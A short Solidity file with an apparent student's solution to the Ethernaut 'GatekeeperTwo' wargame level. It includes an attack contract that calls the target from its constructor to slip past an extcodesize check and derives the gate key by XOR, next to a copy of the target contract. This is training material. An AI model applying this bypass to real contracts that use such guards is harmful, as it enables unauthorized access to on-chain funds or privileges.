// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

   constructor(GatekeeperTwo e1){
    uint64 key = (uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max) ;
    e1.enter(bytes8(key));
   }

}
// 1010 ^ 1001 = 0011
// 1010 ^ 0011 = 1001 

//Ethernaut'dan kopyaladığımız kontrat

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}